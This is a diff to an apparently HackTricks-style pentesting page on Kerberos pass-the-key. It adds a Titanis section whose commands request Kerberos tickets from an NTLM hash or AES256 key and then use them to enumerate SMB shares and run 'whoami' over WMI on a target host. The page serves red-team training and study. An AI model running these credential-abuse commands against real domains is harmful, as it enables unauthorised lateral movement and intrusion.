@@ -44,13 +44,27 @@ To conform to operational security and use AES256, the following command can be 
 1. Create a new logon sesison with **`make_token`** from Cobalt Strike.
 2. Then, use Rubeus to generate a TGT for the new logon session without affecting the existing one.
 
+### Titanis Kerberos (PTK with NTLM hash/AES)
+
+Titanis can request TGT/TGS directly using an NTLM hash or AES keys without plaintext passwords, then use those tickets across SMB2/WMI/SCMR.
+
+```bash
+# Request TGT from NTLM hash (RC4-HMAC)
+Kerb asreq -UserName user -Realm DOMAIN.LOCAL -NtlmHash 2a3de7fe356ee524cc9f3d579f2e0aa7 -Kdc dc.domain.local -OutputFileName user.tgt.kirbi -Overwrite
+
+# Request TGT with AES256
+Kerb asreq -UserName user -Realm DOMAIN.LOCAL -Aes256Key 76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4 -Kdc dc.domain.local -OutputFileName user.tgt.kirbi -Overwrite
+
+# Use TGT to access SMB/WMI (PTT-style)
+Smb2Client enumshares TARGET -Tgt user.tgt.kirbi -Kdc dc.domain.local
+Wmi exec TARGET -Tgt user.tgt.kirbi -Kdc dc.domain.local "whoami"
+```
 
 ## References
 
 - [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
+- [Titanis repository](https://github.com/trustedsec/Titanis)
+- [Titanis Kerb tool docs](https://github.com/trustedsec/Titanis/blob/public/doc/UserGuide/tools/Kerb.md)
 
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
